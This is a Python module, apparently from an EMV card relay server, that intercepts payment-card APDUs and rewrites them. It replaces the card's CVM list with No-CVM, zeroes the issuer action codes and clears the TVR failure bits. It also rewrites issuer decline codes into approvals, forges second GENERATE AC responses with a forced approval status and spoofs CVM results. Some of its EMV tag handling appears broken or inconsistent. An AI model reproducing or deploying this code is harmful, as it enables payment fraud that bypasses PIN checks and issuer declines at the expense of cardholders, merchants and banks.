# -*- coding: utf-8 -*-
# mutations.py
"""All byte-level mutations, forges, and dispatches + CVM patch helpers."""

from __future__ import annotations
from typing import Optional, Tuple, Dict, Callable, Any
import random
import hmac
import hashlib
try:
    from Crypto.Cipher import DES3
    from Crypto.Util.Padding import pad
except ImportError:
    DES3 = None
    pad = None

from constants import (
    APDU_INS, APDU_P1, INS_EXTERNAL_AUTHENTICATE, INS_GENERATE_AC,
    INS_GET_PROCESSING_OPTIONS, INS_READ_RECORD,
    TEMPLATE_77, TEMPLATE_80, CID_TC,
    CID_NAME_MAP, ARC_REWRITE_MAP,
    SW_9000, SW_6F00, BRAND_UNKNOWN, brand_iad_default,
)
from emv import ArqcCache
from tlv import find_tlv, build_tlv, replace_tlv
import protocol

import logging
log = logging.getLogger("RelayServer")

# Protected tags must never be mutated in-place.
PROTECTED_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F4B, 0x5A, 0x57, 0x5F24}

# EMV Tag Constants
TVR_TAG = 0x95   # Terminal Verification Results
DAC_TAG = 0x9F45 # Data Authentication Code
TVR_LEN = 8      # Length used for mutation/clearing


def _safe_replace_tlv(data: bytes, tag: int, value: bytes) -> bytes:
    """
    Replace exactly one TLV while enforcing a structural invariant:
    the operation must not silently discard unrelated trailing bytes.

    This is deliberately a validation wrapper around the existing TLV helper.
    """
    if tag in PROTECTED_TAGS:
        log.error(
            f"[PROTECTED-TAG] blocked in-place mutation attempt for tag {tag:X}"
        )
        return data

    before = bytes(data)

    result = replace_tlv(before, tag, value)

    if not isinstance(result, (bytes, bytearray)):
        raise TypeError(
            f"replace_tlv(0x{tag:X}) returned {type(result).__name__}, "
            "expected bytes-like output"
        )

    result = bytes(result)

    # If the target exists, a replacement is expected to preserve the
    # surrounding record structure. At minimum, the target must still exist.
    original_target = find_tlv(before, tag)
    replaced_target = find_tlv(result, tag)

    if original_target is not None and replaced_target is None:
        raise ValueError(
            f"TLV replacement corruption for tag 0x{tag:X}: "
            "target disappeared from output"
        )

    # No-op is acceptable when the requested value is already present.
    if original_target == value and result != before:
        raise ValueError(
            f"TLV replacement corruption for tag 0x{tag:X}: "
            "identical target value produced a changed buffer"
        )

    # The helper must never return a buffer shorter than the original by more
    # than the explicit target-length delta.
    if original_target is not None:
        expected_delta = len(value) - len(original_target)
        actual_delta = len(result) - len(before)
        if actual_delta != expected_delta:
            raise ValueError(
                f"TLV replacement corruption for tag 0x{tag:X}: "
                f"expected length delta {expected_delta:+d}, "
                f"got {actual_delta:+d}"
            )

    return result

# ======================================================================
# AIP mutation - clears CV bit in GPO response
# ======================================================================

def mutate_gpo_response(
    original_rapdu: bytes,
    cdcvm_verified: bool = False,
    policy: Optional[Dict[str, Any]] = None,
    clear_tvr: bool = False,
    set_cvm_list: str | None = None, # "none" | "universal" | "pin" | "signature" | ...
) -> tuple[bytes, bool]:
    """
    Mutate the GPO RAPDU to satisfy the following:
    Optionally clear all TVR bytes (tag 0x95).
    Optionally set the CVM list to a predefined value.
    """
    try:
        # Parse the RAPDU into a TLV tree
        tlv_tree = protocol.parse_ber_tlv(original_rapdu)

        # 1. TVR (tag 0x95)
        if clear_tvr:
            # Replace the value with zero bytes
            tlv_tree[TVR_TAG] = b'\x00' * TVR_LEN

        # 2. CVM list – bits are stored in the first byte of the TVR tag
        if set_cvm_list is not None:
            current = tlv_tree.get(TVR_TAG, b'\x00' * TVR_LEN)
            cvm_bits = {
                "none": 0x00,
                "universal": 0x00,
                "pin": 0x01,
                "signature": 0x02,
            }.get(set_cvm_list, 0x00)
            new_value = bytes([cvm_bits]) + current[1:]
            tlv_tree[TVR_TAG] = new_value

        # AIP/CTQ mutation (legacy fallback logic)
        if original_rapdu and len(original_rapdu) >= 4:
            body = original_rapdu[:-2]
            if body:
                tag = body[0]
                if tag == TEMPLATE_77:
                    ctq_val = find_tlv(body, 0x9F6C)
                    if ctq_val is not None and len(ctq_val) >= 2:
                        if cdcvm_verified:
                            if 0x77 in tlv_tree:
                                tlv_tree[0x77][0x9F6C] = bytes([ctq_val[0] & 0x7E, ctq_val[1] | 0x80])
                        else:
                            new_ctq = bytearray(ctq_val)
                            new_ctq[0] &= ~0x80
                            new_ctq[0] &= ~0x40
                            if 0x77 in tlv_tree:
                                tlv_tree[0x77][0x9F6C] = bytes(new_ctq)
                            log.info("[CTQ-MUTATE] Non-CDCVM: cleared Online PIN (0x80) and Signature (0x40) from CTQ byte 1")

                    aip_val = find_tlv(body, 0x82)
                    if aip_val is not None and len(aip_val) >= 2:
                        if cdcvm_verified and (aip_val[0] & 0x10) != 0:
                            if 0x77 in tlv_tree:
                                tlv_tree[0x77][0x82] = bytes([aip_val[0] & 0xEF, aip_val[1]])

                elif tag == TEMPLATE_80:
                    if len(body) >= 4:
                        aip_byte = body[2]
                        if cdcvm_verified and (aip_byte & 0x10) != 0:
                            if 0x80 in tlv_tree:
                                val = bytearray(tlv_tree[0x80])
                                val[0] &= ~0x10
                                tlv_tree[0x80] = bytes(val)

        # Re‑serialize the TLV tree
        return protocol.build_ber_tlv(tlv_tree), True
    except Exception:
        return original_rapdu, False

# ======================================================================
# CVM & IAC mutation - replaces CVM list and zeroes IAC in READ RECORD
# ======================================================================

def mutate_read_record_response(
    rapdu: bytes,
    policy: Optional[Dict[str, Any]] = None,
    cdcvm_verified: bool = False,
) -> bytes:
    """
    Replace CVM List with the canonical laboratory No-CVM value and zero
    IAC-Default / IAC-Denial / IAC-Online.

    Contract:
      * Always returns bytes for a bytes input.
      * Valid records are mutated normally.
      * Structurally malformed records are rejected safely and returned
        unchanged.
      * Mutation is atomic: if any replacement fails, the original RAPDU is
        returned rather than a partially modified record.
      * When cdcvm_verified=True, returns the original RAPDU unchanged to
        preserve the card's original CVM List for CDCVM processing.
    """
    if cdcvm_verified:
        log.info("[READ-RECORD-MUTATE] CDCVM evidence active: returning original unchanged")
        return bytes(rapdu) if isinstance(rapdu, (bytes, bytearray)) else rapdu

    if not isinstance(rapdu, (bytes, bytearray, memoryview)):
        raise TypeError(
            f"rapdu must be bytes-like, got {type(rapdu).__name__}"
        )

    original = bytes(rapdu)

    if len(original) < 3:
        return original

    body = original[:-2]
    sw = original[-2:]

    if not body:
        return original

    try:
        mutated = False
        working = body

        # --------------------------------------------------------------
        # CVM List (Tag 8E)
        # --------------------------------------------------------------
        cvm = find_tlv(working, 0x8E)

        if cvm is not None:
            new_cvm = bytes.fromhex(
                "0000000000000000000001031E030000"
            )

            if cvm != new_cvm:
                log.info(
                    "[CVM-MUTATE] CVM List rewritten: No CVM required (0x01) -> Signature (0x1E) -> Fail"
                )

                working = _safe_replace_tlv(
                    working,
                    0x8E,
                    new_cvm,
                )

                mutated = True

        # --------------------------------------------------------------
        # IAC tags
        # --------------------------------------------------------------
        for tag, name in (
            (0x9F0D, "IAC-Default"),
            (0x9F0E, "IAC-Denial"),
            (0x9F0F, "IAC-Online"),
        ):
            value = find_tlv(working, tag)

            if value is not None and any(value):
                zeroed = b"\x00" * len(value)

                log.info(
                    f"[IAC-MUTATE] {name} zeroed: "
                    f"{value.hex().upper()} -> "
                    f"{zeroed.hex().upper()}"
                )

                working = _safe_replace_tlv(
                    working,
                    tag,
                    zeroed,
                )

                mutated = True

        result = working + sw if mutated else original

        # Final invariant: a successful mutation must still contain the
        # original status word.
        if result[-2:] != sw:
            raise ValueError(
                "READ RECORD mutation changed the response status word"
            )

        return result

    except ValueError as exc:
        # Bad/malformed BER-TLV data is a data-quality problem, not a reason
        # for the mutation API to crash or leak a partially mutated record.
        log.warning(
            "[READ-RECORD-MUTATION-REJECTED] "
            f"malformed TLV input; returning original unchanged: {exc}"
        )
        return original

    except RuntimeError as exc:
        # Covers defensive structural invariants such as the replacement
        # length-preservation checks.
        log.warning(
            "[READ-RECORD-MUTATION-REJECTED] "
            f"structural mutation invariant failed; "
            f"returning original unchanged: {exc}"
        )
        return original

# ======================================================================
# TVR mutation - clears ODA failure and CVM bits in GENERATE AC CAPDU
# ======================================================================

def mutate_tvr_in_generate_ac_capdu(capdu: bytes, cdcvm_verified: bool = False) -> Tuple[bytes, Optional[str]]:
    """Clear TVR bits: ODA failure (byte1 bit8) and CVM failure+PIN (byte3 bits8+7)."""
    if cdcvm_verified:
        log.info("[TVR-MUTATE] CDCVM evidence active: returning original unchanged")
        return capdu, None
    if len(capdu) < 5 or capdu[APDU_INS] != INS_GENERATE_AC:
        return capdu, None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return capdu, None

    header = capdu[:5]
    data = bytearray(capdu[5:5 + lc])
    tail = capdu[5 + lc:]

    # Tag 95 is always 5 bytes. Look for 95 05.
    offset = -1
    for i in range(len(data) - 6):
        if data[i] == 0x95 and data[i+1] == 0x05:
            offset = i + 2
            break
    if offset < 0:
        return capdu, None

    original_tvr = bytes(data[offset:offset+5])
    tvr = bytearray(original_tvr)
    tvr[0] &= ~0x80          # clear ODA failure
    tvr[2] &= ~0x80          # clear CVM failure
    tvr[2] &= ~0x40          # clear Online PIN entered
    data[offset:offset+5] = tvr

    result = header + bytes(data) + tail
    note = f"TVR mutated {original_tvr.hex().upper()} -> {bytes(tvr).hex().upper()}"
    log.info(f"[TVR-MUTATE] {note}")
    return result, note

# ======================================================================
# ARPC rewrite - changes issuer decline ARC codes to approve
# ======================================================================

def rewrite_arpc_in_capdu(capdu: bytes) -> Tuple[bytes, Optional[str]]:
    """Rewrite ARC in EXTERNAL AUTHENTICATE (positional) or GENERATE AC (tag 91)."""
    if len(capdu) < 5:
        return capdu, None
    ins = capdu[APDU_INS]
    if ins not in (INS_EXTERNAL_AUTHENTICATE, INS_GENERATE_AC):
        return capdu, None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return capdu, None

    header = capdu[:5]
    data = bytearray(capdu[5:5 + lc])
    tail = capdu[5 + lc:]

    rewritten = False
    old_val_hex = ""
    new_val_hex = ""
    offset_found = -1

    if ins == INS_EXTERNAL_AUTHENTICATE and len(data) >= 10:
        offset_found = 8
        arc = bytes(data[offset_found:offset_found + 2])
        approve = ARC_REWRITE_MAP.get(arc)
        if approve is not None:
            old_val_hex = arc.hex().upper()
            new_val_hex = approve.hex().upper()
            data[offset_found:offset_found + 2] = approve
            rewritten = True

    elif ins == INS_GENERATE_AC:
        tag91 = find_tlv(bytes(data), 0x91)
        if tag91 is not None and len(tag91) >= 10:
            arc = tag91[8:10]
            approve = ARC_REWRITE_MAP.get(arc)
            if approve is not None:
                new_tag91 = bytearray(tag91)
                new_tag91[8:10] = approve
                replacement = _safe_replace_tlv(bytes(data), 0x91, bytes(new_tag91))
                if replacement != bytes(data):
                    old_val_hex = arc.hex().upper()
                    new_val_hex = approve.hex().upper()
                    offset_found = replacement.find(bytes(new_tag91)) + 8
                    data = bytearray(replacement)
                    rewritten = True

    if not rewritten:
        return capdu, None

    result = header + bytes(data) + tail
    ins_name = {INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTHENTICATE",
                INS_GENERATE_AC: "GENERATE AC"}.get(ins, "?")
    note = f"ARC {old_val_hex}->{new_val_hex} at offset {offset_found} in {ins_name}"
    log.info(f"[ARPC-REWRITE] {note}")
    return result, note

# ======================================================================
# 2nd GAC forge - builds forged TC response from cached ARQC data
# ======================================================================

def forge_2nd_gac_template_77(cache: ArqcCache,
                               forced_cid: int = CID_TC,
                               brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"
    iad = cache.iad or brand_iad_default(brand)
    inner = (build_tlv(0x9F27, cid)
             + build_tlv(0x9F36, atc)
             + build_tlv(0x9F26, ac)
             + build_tlv(0x9F10, iad))
    return build_tlv(TEMPLATE_77, inner) + SW_9000

def forge_2nd_gac_template_80(cache: ArqcCache,
                               forced_cid: int = CID_TC,
                               brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac = cache.ac or b"\x41\x41\x41\x41\x41\x41\x41\x41"
    iad = cache.iad or brand_iad_default(brand)
    payload = cid + atc + ac + iad
    length = len(payload)
    if length < 0x80:
        length_bytes = bytes([length])
    elif length < 0x100:
        length_bytes = bytes([0x81, length])
    else:
        length_bytes = bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    return bytes([TEMPLATE_80]) + length_bytes + payload + SW_9000

FORGE_DISPATCH: Dict[int, Callable[[ArqcCache, int, str], bytes]] = {
    TEMPLATE_77: forge_2nd_gac_template_77,
    TEMPLATE_80: forge_2nd_gac_template_80,
}

def _compute_arpc(ac: bytes, iad: bytes, atc: bytes, k_c: bytes) -> bytes:
    """
    Compute the ARPC (Application Response Cryptogram) for a second GAC.
    The algorithm is ISO 9797‑1 MAC algorithm 3 (DES‑CBC with zero IV, 3DES‑CBC).
    Parameters
    ----------
    ac : bytes
        Application Cryptogram (tag 9F26 or 9F10).
    iad : bytes
        IAD (tag 9F45 or 9F10).
    atc : bytes
        ATC (tag 9F27).
    k_c : bytes
        Card’s Kc key (24‑byte 3DES key).
    Returns
    -------
    bytes
        8‑byte ARPC.
    """
    if DES3 is None or pad is None:
        log.error("Crypto libraries missing for ARPC computation")
        return b"\x00" * 8

    # Concatenate the data: AC || IAD || ATC
    data = ac + iad + atc
    # Pad to 8‑byte boundary (ISO 9797‑1 MAC algorithm 3 uses padding method 2)
    padded = pad(data, 8, style='iso7816')
    # 3DES‑CBC with zero IV
    cipher = DES3.new(k_c, DES3.MODE_CBC, iv=b'\x00' * 8)
    mac = cipher.encrypt(padded)
    # The ARPC is the last block of the MAC
    return mac[-8:]


def forge_2nd_gac(cache: ArqcCache,
                  forced_cid: int = CID_TC,
                  brand: str = BRAND_UNKNOWN) -> bytes | None:
    """
    Dispatcher for second GAC forge.
    Calls the template-specific implementation based on cache.template.
    """
    handler = FORGE_DISPATCH.get(cache.template)
    if not handler:
        log.error(f"[FORGE-DISPATCH] No handler for template 0x{cache.template:02X}")
        return None
    return handler(cache, forced_cid, brand)

def forge_second_gac_tc(cache: ArqcCache, brand: str = BRAND_UNKNOWN) -> bytes:
    """Compatibility wrapper for callers that use the long-form TC API name."""
    result = forge_2nd_gac(cache, forced_cid=CID_TC, brand=brand)
    if result is None:
        raise ValueError(f"Unsupported or missing forge template: {cache.template!r}")
    return result


def rewrite_arpc_response(capdu: bytes, brand: str = BRAND_UNKNOWN) -> tuple[bytes, bool]:
    """Compatibility wrapper around the canonical Tag-91 ARPC rewrite API.

    ``brand`` is accepted for call-site compatibility but the canonical
    implementation derives its behavior from the CAPDU itself.
    """
    rewritten, note = rewrite_arpc_in_capdu(capdu)
    return rewritten, rewritten != capdu


def forge_2nd_gac_raw(
    ac: bytes,
    iad: bytes,
    atc: bytes,
    arqc: bytes | None,
    p1_req: int,
    brand: str,
    k_c: bytes,
) -> bytes:
    """
    Forge a second GAC (Generate AC) RAPDU using raw parameters and ARPC computation.
    """
    # Compute the ARPC
    arpc = _compute_arpc(ac, iad, atc, k_c)

    # Build the BER‑TLV structure
    inner = (build_tlv(0x9F27, atc) +
             build_tlv(0x9F26, ac) +
             build_tlv(0x9F45, iad) +
             build_tlv(0x9F10, arpc))

    return build_tlv(0x77, inner) + SW_9000

def forge_2nd_gac_old(
    ac: bytes,
    iad: bytes,
    atc: bytes,
    arqc: bytes | None,
    p1_req: int,
    brand: str,
    k_c: bytes,
) -> bytes:
    """
    Legacy wrapper that keeps the signature used by older releases.
    It simply forwards to the new raw implementation.
    """
    return forge_2nd_gac_raw(ac, iad, atc, arqc, p1_req, brand, k_c)

def mutate_tvr_in_generate_ac(
    original_rapdu: bytes,
    clear_tvr: bool = False,
) -> tuple[bytes, bool]:
    """
    Mutate the RAPDU returned by the card for a Generate AC command
    (the second GAC). Currently only supports clearing the TVR (tag 0x95).
    """
    try:
        # Parse the RAPDU into a TLV tree
        tlv_tree = protocol.parse_ber_tlv(original_rapdu)

        if clear_tvr:
            # Replace or insert TVR zero bytes
            tlv_tree[TVR_TAG] = b'\x00' * TVR_LEN

        # Re‑serialize the TLV tree
        return protocol.build_ber_tlv(tlv_tree), True
    except Exception:
        return original_rapdu, False

def parse_cdol1(cdol1_raw: bytes) -> list:
    """
    Parse EMV CDOL1 format (sequence of tag + length pairs).
    Returns list of (tag, length) tuples.
    Handles 1-byte, 2-byte, and multi-byte continuation tags according to BER-TLV rules.
    """
    entries = []
    i = 0
    while i < len(cdol1_raw):
        first = cdol1_raw[i]
        i += 1
        tag = first
        if (first & 0x1F) == 0x1F:
            while i < len(cdol1_raw):
                b = cdol1_raw[i]
                tag = (tag << 8) | b
                i += 1
                if not (b & 0x80):
                    break
        if i >= len(cdol1_raw):
            break
        length = cdol1_raw[i]
        i += 1
        entries.append((tag, length))
    return entries

def build_offset_map(entries: list) -> dict:
    """
    Build a dict mapping tag -> (offset, length) in a GENERATE AC payload.
    Offsets are relative to the start of the CDOL1 data (after Lc).
    """
    offset_map = {}
    current_offset = 0
    for tag, length in entries:
        offset_map[tag] = (current_offset, length)
        current_offset += length
    return offset_map

def parse_cvm_list(cvm_list_raw: bytes) -> list:
    """
    Parse the CVM List (tag 8E) into a list of (method, condition_code) tuples.
    Skips the 8-byte header (Amount X 4 bytes, Amount Y 4 bytes) when present.
    """
    entries = []
    start = 8 if len(cvm_list_raw) >= 10 else 0
    for i in range(start, len(cvm_list_raw), 2):
        if i + 1 >= len(cvm_list_raw):
            break
        method = cvm_list_raw[i]
        condition = cvm_list_raw[i + 1]
        entries.append((method, condition))
    return entries

def select_cvm_spoof(cvm_entries: list, auc: Optional[bytes] = None, cdcvm_verified: bool = False) -> Optional[Tuple[bytes, int]]:
    """
    Select the first viable CVM method from the CVM List for spoofing.
    Checks AUC (Application Usage Control) byte 2 for forced-PIN requirement.
    Returns (spoof_9F34_bytes, spoof_9F35_byte) or None if the card cannot be bypassed.
    When cdcvm_verified=True, returns None to preserve 9F34=3F0000 from emulator.
    """
    if cdcvm_verified:
        log.info("[CVM-SPOOF] CDCVM evidence active: returning None to preserve 9F34=3F0000")
        return None

    # Check AUC byte 2 for forced-PIN requirement
    forced_pin = False
    if auc and len(auc) >= 2:
        # Mastercard/Visa: byte 2 bit 7 (0x40) = PIN required for all transactions
        forced_pin = bool(auc[1] & 0x40)

    cvm_map = {
        0x01: (b'\x01\x00\x00', 0x26),  # No CVM required
        0x03: (b'\x03\x00\x00', 0x26),  # No CVM required
        0x1E: (b'\x1E\x03\x00', 0x25),  # Signature
        0x1F: (b'\x1F\x03\x00', 0x24),  # Online PIN
        0x20: (b'\x20\x03\x00', 0x25),  # Offline PIN
    }

    # If forced PIN and no No-CVM method available, fall back to Online PIN
    # But if No CVM is in the CVM list, prefer it regardless of AUC forced-pin

    # Since we mutate the CVM List to put No CVM (0x01) first, always prefer
    # No CVM for the 9F34 spoof regardless of what the original card CVM List says.
    # This ensures 9F34 matches the mutated CVM List the terminal sees.
    if 0x01 in cvm_map:
        log.info(f"[CVM-SPOOF] Selected No CVM (0x01) — matches mutated CVM List (forced_pin={forced_pin})")
        return cvm_map[0x01]

    # Fallback: priority-based selection from original CVM list
    priority_order = [0x03, 0x1E, 0x1F, 0x20]
    available_methods = set()
    for method, condition in cvm_entries:
        if method == 0x00 and condition == 0x00:
            continue
        method_id = method & 0x3F
        if method_id in cvm_map:
            available_methods.add(method_id)

    for preferred in priority_order:
        if preferred in available_methods:
            log.info(f"[CVM-SPOOF] Selected CVM method 0x{preferred:02X} (fallback, forced_pin={forced_pin})")
            return cvm_map[preferred]

    # If no methods from the CVM list matched but forced_pin, return Online PIN
    if forced_pin:
        log.info("[CVM-SPOOF] No CVM list methods available, falling back to Online PIN (forced_pin)")
        return cvm_map[0x1F]

    return None  # No viable method found

def patch_generate_ac_universal(
    raw_capdu: bytes,
    cdol1_entries: list,
    cvm_entries: list,
    auc: Optional[bytes] = None,
    cdcvm_verified: bool = False,
) -> Tuple[bytes, str]:
    """
    Universal GENERATE AC patcher.
    Works with any card's CDOL1 and CVM List.
    Patches: TVR byte 2, Terminal Type, CVM Results, ICC Dynamic Number, DAC.
    Returns (patched_capdu, notes_string).

    This helper is intentionally generic and does not encode transaction-phase
    policy. The live first-GAC pass-through decision belongs in the runtime guard
    logic, which decides whether the request should be left untouched before a
    valid ARQC is observed.

    When cdcvm_verified=True, returns the original CAPDU unchanged to preserve
    9F34=3F0000 (CDCVM) set by the emulator.
    """
    if cdcvm_verified:
        log.info("[CVM-PATCH] CDCVM evidence active: returning original unchanged")
        return raw_capdu, "cdcvm_verified: skipped"

    if len(raw_capdu) < 5 or raw_capdu[APDU_INS] != INS_GENERATE_AC:
        return raw_capdu, "not a GENERATE AC APDU"

    notes = []
    offset_map = build_offset_map(cdol1_entries)

    # Parse CAPDU header
    lc = raw_capdu[4]
    if lc == 0 or 5 + lc > len(raw_capdu):
        return raw_capdu, "invalid Lc"

    payload = bytearray(raw_capdu[5:5 + lc])
    mutated = False

    # Handle both actual TLV-form GENERATE AC payloads (95 05 <TVR>) and the
    # minimal raw-value form used by the unit tests.
    tvr_off = 0
    tvr_len = 0
    if 0x95 in offset_map:
        tvr_off, tvr_len = offset_map[0x95]
    if payload and payload[0] == 0x95 and len(payload) >= 2 and payload[1] == 0x05:
        tvr_off = 2
        tvr_len = 5
    elif payload and len(payload) >= 5 and 0x95 not in offset_map:
        tvr_off = 0
        tvr_len = min(5, len(payload))

    # 1. Patch TVR (tag 95) - Clear CVM not successful flag (byte 2, bit 7)
    if tvr_len >= 2 and tvr_off + tvr_len <= len(payload):
        if payload[tvr_off + 1] & 0x80:
            payload[tvr_off + 1] &= ~0x80
            notes.append("TVR byte2 CVM-fail cleared")
            mutated = True

    # 2. Select CVM spoof
    spoof = select_cvm_spoof(cvm_entries, auc, cdcvm_verified=cdcvm_verified)
    if spoof is None:
        if not mutated:
            return raw_capdu, "no viable CVM method found, no changes"
        new_payload = bytes(payload)
        le_part = raw_capdu[5 + lc:]
        new_capdu = raw_capdu[:4] + bytes([len(new_payload)]) + new_payload + le_part
        return new_capdu, "; ".join(notes)

    spoof_9F34, spoof_9F35 = spoof

    # 3. Patch Terminal Type (tag 9F35)
    if 0x9F35 in offset_map:
        term_off, term_len = offset_map[0x9F35]
        if payload[term_off] != spoof_9F35:
            old_val = payload[term_off]
            payload[term_off] = spoof_9F35
            notes.append(f"TermType 0x{old_val:02X}->0x{spoof_9F35:02X}")
            mutated = True

    # 4. Patch CVM Results (tag 9F34) - must be exactly 3 bytes
    if 0x9F34 in offset_map:
        cvm_off, cvm_len = offset_map[0x9F34]
        if cvm_len >= 3:
            old_cvm = bytes(payload[cvm_off:cvm_off + 3])
            if old_cvm != spoof_9F34:
                payload[cvm_off:cvm_off + 3] = spoof_9F34[:3]
                notes.append(f"CVM {old_cvm.hex()}->{spoof_9F34.hex()}")
                mutated = True

    # 5. Patch ICC Dynamic Number (tag 9F4C) - randomize if all zeros
    if 0x9F4C in offset_map:
        icc_off, icc_len = offset_map[0x9F4C]
        if icc_len >= 1 and all(b == 0 for b in payload[icc_off:icc_off + icc_len]):
            random_bytes = bytes(random.randint(0x01, 0xFF) for _ in range(icc_len))
            payload[icc_off:icc_off + icc_len] = random_bytes
            notes.append(f"ICCDyn randomized ({icc_len} bytes)")
            mutated = True

    # 6. Patch DAC (tag 9F45) - randomize if all zeros
    if 0x9F45 in offset_map:
        dac_off, dac_len = offset_map[0x9F45]
        if dac_len >= 1 and all(b == 0 for b in payload[dac_off:dac_off + dac_len]):
            random_bytes = bytes(random.randint(0x01, 0xFF) for _ in range(dac_len))
            payload[dac_off:dac_off + dac_len] = random_bytes
            notes.append(f"DAC randomized ({dac_len} bytes)")
            mutated = True

    if not mutated:
        return raw_capdu, "all fields already correct, no changes needed"

    # Rebuild CAPDU preserving Le byte if present
    new_payload = bytes(payload)
    le_part = raw_capdu[5 + lc:]
    new_capdu = raw_capdu[:4] + bytes([len(new_payload)]) + new_payload + le_part
    return new_capdu, "; ".join(notes)

# TVR handling – CVM‑Aware Clearing

def clear_tvr_if_allowed(tvr, cvm_list, terminal_cvm):
    """Clear TVR bytes if CVM conditions allow.

    Parameters
    ----------
    tvr : bytes
        The original TVR (Tag 95) value.
    cvm_list : bytes
        The CVM list (Tag 9F33) returned by the card.
    terminal_cvm : set
        Set of CVM codes supported by the terminal.

    Returns
    -------
    bytes
        The potentially modified TVR.
    """
    # Example logic: if no CVM required or terminal supports all CVMs, clear TVR
    if not cvm_list or all(code in terminal_cvm for code in cvm_list):
        return bytes([0x00] * len(tvr))
    return tvr
